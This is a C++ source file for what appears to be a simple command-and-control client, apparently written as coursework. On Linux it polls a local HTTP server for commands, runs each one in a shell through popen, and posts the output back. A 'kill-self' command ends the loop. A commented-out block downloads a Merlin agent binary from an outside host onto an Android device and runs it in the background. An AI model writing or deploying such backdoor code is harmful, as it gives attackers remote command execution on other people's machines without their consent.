#include <string>
#include <vector>
#include <stdio.h>
#include <stdlib.h>
#include <thread>
#include <chrono>
#include <iostream>
#include "curl/curl.h"

using namespace std; 

string get_os_name() {
    #ifdef _WIN32
    return "Windows 32-bit";
    #elif _WIN64
    return "Windows 64-bit";
    #elif __APPLE__
    return "Apple";
    #elif __ANDROID__
    return "Android";
    #elif __linux__
    return "Linux";
    #elif __unix || __unix__
    return "Unix";
    #else
    return "Other";
    #endif
}

int CLIENTNUMBER;
string LASTCOMMAND;

struct Command{
    string time;
    int ClientNumber;
    string command;
} type;

size_t write_data_file(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}

static string readBuffer;
size_t write_data(char *ptr, size_t size, size_t nmemb, string *stream) {
    for (int i = 0; i<size*nmemb; i++)
    {
        readBuffer.push_back(ptr[i]);
    }
    return size * nmemb;
}

void download_file(string url, string location) {
    CURL *curl = curl_easy_init();
    FILE *fp;
    CURLcode res;

    if (curl) {
        fp = fopen(location.c_str(), "wb");
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data_file);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        fclose(fp);
    }
}

void send_terminal_back(int clientNumber, string terminal){
    CURL *curl = curl_easy_init();
    CURLcode res;
    string postMsg = "num=" + to_string(clientNumber) + "&cmd=" + terminal;

    curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:3000/command");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postMsg.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, postMsg.length());
    curl_easy_setopt(curl, CURLOPT_POST, 1);
    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
}

string send_to_terminal(string cmd){
    //system(cmd.c_str());
    char path[1035];

    FILE *fp = popen( cmd.c_str(), "r");

    if( fp == NULL){
        cout << "Failed to run" << endl;
    }
    char output [1035];
    string final = "";
    while( fgets(path, sizeof(path)-1, fp) != NULL){
        final += path;
    }

    pclose(fp);

    return final;
}

string get_command()
{
    CURL *curl = curl_easy_init();
    CURLcode res;

    struct curl_slist *list = NULL;

    if(curl){
        string response_string;
        string header_string;
        readBuffer.clear();
        curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:3000/newCmd");
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);
        curl_easy_setopt(curl, CURLOPT_HEADERDATA, &header_string);

        curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        curl = NULL;
    }

    return readBuffer;
}

// the header of the url responce gets mixed up with 
string strip_responce_string(string res){
    size_t pos = res.find("time:"); //get location of time:
    res.erase(0,pos); //delete everthing before that line
    return res;
}

// I hate this function. So I hardcoded it.
void parse_command(Command &cmd, string str){
    vector<string> v;

    size_t plc = str.find("cnum:");

    //Time value saved
    v.push_back( str.substr(0,plc) );
    str.erase(0,plc);

    //client number
    plc = str.find("cmd:");
    v.push_back( str.substr(0,plc) );
    str.erase(0,plc);

    //command string
    //str.erase(0,4);
    v.push_back( str );


    string temp;
    temp = v[0];
    temp.erase(0,5);
    cmd.time = temp;
    temp.clear();

    temp = v[1];
    temp.erase(0,5);
    cmd.ClientNumber = stoi(temp);
    temp.clear();

    temp = v[2];
    temp.erase(0,4);
    cmd.command = temp;
    temp.clear();
}


string Check_Num_Send_to_Terminal(Command obj){
    string res;
    if(CLIENTNUMBER == obj.ClientNumber && LASTCOMMAND != obj.command){
        res = send_to_terminal(obj.command);
        LASTCOMMAND = obj.command;
        return res;
    }else{
        return "NULL";
    }
}


int main() {
    string os_name = get_os_name();

    //Connect to server and get client number
    CLIENTNUMBER = 1;
    LASTCOMMAND = "";
    struct Command newCmd;    

    if (os_name == "Linux") {
        while(1)
        {
            //GET data
            string outputTest = get_command();
            outputTest = strip_responce_string(outputTest);

            if(outputTest != "")
            {
                //Parse Data for Use
                
                parse_command(newCmd, outputTest);
            }

            //Checks to make sure the command to remove itself has not been called
            if(newCmd.ClientNumber == CLIENTNUMBER && newCmd.command == "\"kill-self\"")
            {
                //self delete the program
                return 0;
            }

            //Wait to see if the command is updated
            if(newCmd.command == LASTCOMMAND)
            {
                //wait 5 seconds to check for update
                this_thread::sleep_for(chrono::seconds(5));
            }else{
                //Use Command
                string sysResponce;
                sysResponce = Check_Num_Send_to_Terminal(newCmd);
                if(sysResponce != "NULL")
                {
                    //POST system responce to server
                    sysResponce = "\"" + sysResponce + "\"";
                    send_terminal_back(CLIENTNUMBER, sysResponce);
                    cout << endl;
                }
            }
        }
        /*string merlin = "/data/local/tmp/merlin";

        download_file("http://cs4001.root.sx/android/merlinAgent-Android-arm", merlin);
        system(("chmod +x " + merlin).c_str());
        system(("cd /data/local/tmp && nohup " + merlin + " &").c_str());*/

    } else {
        cout << "Architecture not supported" << endl;
    }
    return 0;
}
